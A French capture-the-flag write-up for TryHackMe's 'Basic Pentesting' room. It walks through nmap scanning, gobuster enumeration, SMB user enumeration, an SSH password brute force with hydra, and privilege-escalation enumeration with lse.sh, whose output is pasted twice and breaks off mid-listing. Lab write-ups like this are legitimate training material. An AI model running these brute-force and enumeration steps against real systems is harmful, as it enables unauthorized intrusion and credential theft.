# Basic Pentesting #

***

**Deploy the machine and connect to our network**
Ici on vous demande déployez la machine et de vous connecter.  
Cliquez sur Start Machine.

Pour vous connecter faite :  
```bash
sudo openvpn monVpn.ovpn
```
***

**Find the services exposed by the machine**
Pour voir les services exposés il faut utiliser nmap.  
Mais avant nous allons faire un ping sur la machine distante.  

```bash
tim@kali:~/Bureau/tryhackme$ ping 10.10.64.60
PING 10.10.64.60 (10.10.64.60) 56(84) bytes of data.
64 bytes from 10.10.64.60: icmp_seq=1 ttl=63 time=85.8 ms
64 bytes from 10.10.64.60: icmp_seq=2 ttl=63 time=67.8 ms
```

Ici, le ping fonctionne par contre veuillez mettre la bonne IP de la machine distante.

```bash
tim@kali:~/Bureau/tryhackme$ sudo nmap -sS  10.10.64.60 -p0-65535
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-11 21:17 CEST
Nmap scan report for 10.10.64.60
Host is up (0.035s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

```

Ici on utilise nmap avec l'option : sS Scan TCP SYN (scan TCP half open)
                                  : -p0-65535 scan du port 0 à 65535

Si dessus on voit les différents services.  

**What is the name of the hidden directory on the web server(enter name without /)?**
Pour trouver le repertoire cacher nous allons utiliser le logiciel gobuster.  

```bash
tim@kali:~/Bureau/tryhackme$ gobuster dir -b 404,403 -u http://10.10.64.60 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/11 21:45:17 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.64.60/**************/]
                                                                                     
===============================================================
2021/07/11 21:50:44 Finished
===============================================================

```

On enlève les codes d'erreurs 404 et 403, et on voit le répertoire caché.  

**User brute-forcing to find the username & password**

Ici on nous demande de utiliser la méthode brute forçage pour trouve le nom et le mot de passe.  

**What is the username?**

Dans notre énumération avec nmap nous voyons deux ports ouvert le 139 et 445, qui correspond au service SAMBA.
Faisons une énumération avec enum4linux

```bash
tim@kali:~/Bureau/tryhackme$ sudo enum4linux 10.10.108.194 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 11 23:19:19 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.108.194
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.108.194    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.108.194    |
 ============================================= 
Looking up status of 10.10.108.194
	BASIC2          <00> -         B <ACTIVE>  Workstation Service
	BASIC2          <03> -         B <ACTIVE>  Messenger Service
	BASIC2          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.108.194    |
 ====================================== 
[+] Server 10.10.108.194 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.108.194    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.108.194    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.108.194 from smbclient: 
[+] Got OS info for 10.10.108.194 from srvinfo:
	BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.108.194    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 10.10.108.194    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.108.194
//10.10.108.194/Anonymous	Mapping: OK, Listing: OK
//10.10.108.194/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.108.194    |
 ===================================================== 


[+] Attaching to 10.10.108.194 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] BASIC2
	[+] Builtin

[+] Password Info for Domain: BASIC2

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.108.194    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.108.194 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\*** (Local User)    # ici on à le nom d'utilisateur.
S-1-22-1-1001 Unix User\*** (Local User)

```

Ici à la fin on trouve un nom.  

**What is the password?**

On peut essayer de brute forcer le service sur le port 22 avec hydra.

```bash
tim@kali:~/Bureau/tryhackme$ cat /usr/share/wordlists/rockyou.txt | grep -E "^.......$" > 7lettres.txt
tim@kali:~/Bureau/tryhackme$ hydra -l jan -P 7lettres.txt ssh://10.10.158.19 -t 12
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-12 10:00:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 2507225 login tries (l:1/p:2507225), ~208936 tries per task
[DATA] attacking ssh://10.10.158.19:22/
[STATUS] 132.00 tries/min, 132 tries in 00:01h, 2507093 to do in 316:34h, 12 active
[22][ssh] host: 10.10.158.19   login: ***   password: *******
```

On premier lieu je prend que les mots de pass de 7 lettres car l'attaque brute force sur le SSH et lente.  
Puis on utilise le hydra pour casser le mot de passe.  

**What service do you use to access the server(answer in abbreviation in all caps)?**

La réponse le nom de service dont le mot de passe a été cassé.  

**Enumerate the machine to find any vectors for privilege escalation**


Sur notre machine on télécharge un logiciel pour énumerer les failles sur la machine cible.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget -nv https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
2021-07-12 10:31:59 URL:https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh [41640/41640] -> "lse.sh" [1]
```

On copie le fichier lse.sh sur la cible, dans le répertoire tmp

```bash
tim@kali:~/Bureau/tryhackme/write-up$ scp ./lse.sh ***@10.10.158.19:/tmp
***@10.10.158.19's password: 
lse.sh                                        
```

On se connect sur le service ssh et on exécute lse.sh

```bash
ssh jan@10.10.158.19
The authenticity of host '10.10.158.19 (10.10.158.19)' can't be established.
ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.158.19' (ECDSA) to the list of known hosts.
jan@10.10.158.19's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102


jan@basic2:~$ sh /tmp/lse.sh -l1
---
If you know the current user password, write it here to check sudo privileges: armando
---

 LSE Version: 3.4

        User: jan
     User ID: 1001
    Password: ******
        Home: /home/jan
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: basic2
       Linux: 4.4.0-119-generic
Distribution: Ubuntu 16.04.4 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
---
adm:x:4:syslog,kay
sudo:x:27:kay
---
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
jan:x:1001:1001::/home/jan:/bin/bash
---
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
---
/bin
/sbin
/usr/bin
/usr/games
/usr/local/bin
/usr/local/games
/usr/local/sbin
/usr/sbin
---
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
---
kay
---
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
---
/run/acpid.socket
/run/snapd-snap.socket
/run/snapd.socket
/run/uuidd/request
/run/dbus/system_bus_socket
/run/user/1001
/run/user/1001/systemd
/run/user/1001/systemd/private
/run/user/1001/systemd/notify
/run/samba/nmbd/unexpected
/run/systemd/journal/dev-log
/run/systemd/journal/socket
/run/systemd/journal/stdout
/run/systemd/journal/syslog
/run/systemd/private
/run/systemd/notify
/run/lock
/tmp
/tmp/tmp.xMqMLlvggf
/tmp/lse.sh
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/tmp.NpnnlNEOlk
/var/spool/samba
/var/tmp
/var/crash
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
---
[*] fst010 Binaries with setuid bit........................................ yes!
---
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
---
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/vim.basic
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
---
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
---
[*] fst090 SSH files in home directories................................... yes!
---
-rw-rw-r-- 1 kay kay 771 Apr 23  2018 /home/kay/.ssh/authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 /home/kay/.ssh/id_rsa
-rw-r--r-- 1 kay kay 771 Apr 19  2018 /home/kay/.ssh/id_rsa.pub
---
[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/dig
/bin/nc.openbsd
/bin/nc
/bin/netcat
/usr/bin/wget
---
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'jan' have mail?........................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'jan'....................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin prohibit-password
---
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
---
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
---
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
/etc/cron.d/popularity-contest:SHELL=/bin/sh
/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:44 4 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/var/crash
/var/crash/.
---
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
---
tcp    LISTEN     0      1      ::ffff:127.0.0.1:8005                 :::*                  
---
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
---
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_event_module (shared)
 negotiation_module (shared)
 setenvif_module (shared)
 status_module (shared)
---
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
---
START      PID     USER COMMAND
04:37    15741     root sudo -S -l
04:37    15732     root sudo -S id
04:37    15713     root sudo -nS id
03:42      987     root /usr/sbin/sshd -D
03:42      984     root /usr/sbin/smbd -D
03:42      928     root /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
03:42      899     root /usr/sbin/smbd -D
03:42      882     root /usr/lib/policykit-1/polkitd --no-debug
03:42      875     root /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
03:42      854     root /usr/lib/snapd/snapd
03:42      850     root /lib/systemd/systemd-logind
03:42      844     root /usr/lib/accountsservice/accounts-daemon
03:42      832     root /usr/bin/lxcfs /var/lib/lxcfs/
03:42      825     root /usr/sbin/cron -f
03:42      823     root /usr/sbin/acpid
03:42      418     root /lib/systemd/systemd-udevd
03:42      388     root /sbin/lvmetad -f
03:42      357     root /lib/systemd/systemd-journald
03:42        1     root /sbin/init
03:42     1155     root /usr/sbin/apache2 -k start
03:42     1149     root /usr/sbin/nmbd -D
03:42     1127     root /sbin/agetty --noclear tty1 linux
03:42     1125     root /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
03:42     1040     root /usr/sbin/smbd -D
03:42     1012     root /sbin/iscsid
03:42     1011     root /sbin/iscsid
---
[*] pro030 Processes running by non-root users with shell.................. yes!
---


------ jan ------


START      PID     USER COMMAND
04:38    27498      jan sleep 1
04:38    27236      jan sleep 1
04:38    26975      jan sleep 1
04:38    26745      jan sleep 1
04:38    26485      jan sleep 1
04:37    26222      jan sleep 1
04:37    25959      jan sleep 1
04:37    25696      jan sleep 1
04:37    25433      jan sleep 1
04:37    25170      jan sleep 1
04:37    24909      jan sleep 1
04:37    24649      jan sleep 1
04:37    24389      jan sleep 1
04:37    24158      jan sleep 1
04:37    23895      jan sleep 1
04:37    23636      jan sleep 1
04:37    23635      jan sh /tmp/lse.sh -l1
04:37    23475      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *dockerenv* -exec ls -la {} ;
04:37    23472      jan sh /tmp/lse.sh -l1
04:37    23413      jan sh /tmp/lse.sh -l1
04:37    23374      jan sh /tmp/lse.sh -l1
04:37    23106      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -name *.htpasswd -print -exec cat {} ;
04:37    23105      jan sh /tmp/lse.sh -l1
04:37    23086      jan /usr/sbin/apache2 -M
04:37    23083      jan /bin/sh /usr/sbin/apache2ctl -M
04:37    23082      jan sh /tmp/lse.sh -l1
04:37    22844      jan sleep 0.2
04:37    22843      jan tcpdump -i lo -n
04:37    22841      jan grep -i listening on lo
04:37    22840      jan sh /tmp/lse.sh -l1
04:37    22839      jan sh /tmp/lse.sh -l1
04:37    22779      jan sort -u
04:37    22778      jan grep -Ev /dev/(null|zero|random|urandom)
04:37    22777      jan grep --color=never -hERoi /[a-z0-9_/\.\-]+ /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly /etc/crontab
04:37    22776      jan sh /tmp/lse.sh -l1
04:37    22775      jan sh /tmp/lse.sh -l1
04:37    22727      jan sh /tmp/lse.sh -l1
04:37    22658      jan sh /tmp/lse.sh -l1
04:37    22065      jan getcap -r /
04:37    22064      jan sh /tmp/lse.sh -l1
04:37    21981      jan grep -v root
04:37    21980      jan sh /tmp/lse.sh -l1
04:37    21979      jan sh /tmp/lse.sh -l1
04:37    21762      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /usr/lib -prune -o -path /usr/share -prune -o -regextype egrep -iregex .*(backup|dump|cop(y|ies)|bak|bkp)[^/]*\.(sql|tgz|tar|zip)?\.?(gz|xz|bzip2|bz2|lz|7z)? -readable -type f -exec ls -al {} ;
04:37    21761      jan sh /tmp/lse.sh -l1
04:37    21740      jan sh /tmp/lse.sh -l1
04:37    21207      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o ( -name .git -o -name .svn ) -print
04:37    21206      jan sh /tmp/lse.sh -l1
04:37    21161      jan sh /tmp/lse.sh -l1
04:37    21123      jan find /home/kay ( -name *id_dsa* -o -name *id_rsa* -o -name *id_ecdsa* -o -name *id_ed25519* -o -name known_hosts -o -name authorized_hosts -o -name authorized_keys ) -exec ls -la {} ;
04:37    21116      jan sh /tmp/lse.sh -l1
04:37    21115      jan sh /tmp/lse.sh -l1
04:37    20781      jan sh /tmp/lse.sh -l1
04:37    18959      jan find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -perm -4000 -type f -print
04:37    18958      jan sh /tmp/lse.sh -l1
04:37    17412      jan find / -path /home/jan -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type l -user jan -print
04:37    15768      jan find / -path /home/jan -prune -o -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -not -type l -writable -print
04:37    15767      jan sh /tmp/lse.sh -l1
04:37    15739      jan sh /tmp/lse.sh -l1
04:37    15730      jan sh /tmp/lse.sh -l1
04:37    15711      jan sh /tmp/lse.sh -l1
04:37    15528      jan sort -u
04:37    15527      jan tr : 
04:37    15526      jan cut -d= -f2
04:37    15525      jan tr -d "'
04:37    15524      jan grep -ERh ^ *PATH=.* /etc/
04:37    15523      jan sh /tmp/lse.sh -l1
04:37    15522      jan sh /tmp/lse.sh -l1
04:37    15470      jan sed s/^ *//gjan@basic2:~$ sh /tmp/lse.sh -l1
---
If you know the current user password, write it here to check sudo privileges: armando
---

 LSE Version: 3.4

        User: jan
     User ID: 1001
    Password: ******
        Home: /home/jan
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: basic2
       Linux: 4.4.0-119-generic
Distribution: Ubuntu 16.04.4 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
---
adm:x:4:syslog,kay
sudo:x:27:kay
---
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
jan:x:1001:1001::/home/jan:/bin/bash
---
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
---
/bin
/sbin
/usr/bin
/usr/games
/usr/local/bin
/usr/local/games
/usr/local/sbin
/usr/sbin
---
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
---
kay
---
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
---
/run/acpid.socket
/run/snapd-snap.socket
/run/snapd.socket
/run/uuidd/request
/run/dbus/system_bus_socket
/run/user/1001
/run/user/1001/systemd
/run/user/1001/systemd/private
/run/user/1001/systemd/notify
/run/samba/nmbd/unexpected
/run/systemd/journal/dev-log
/run/systemd/journal/socket
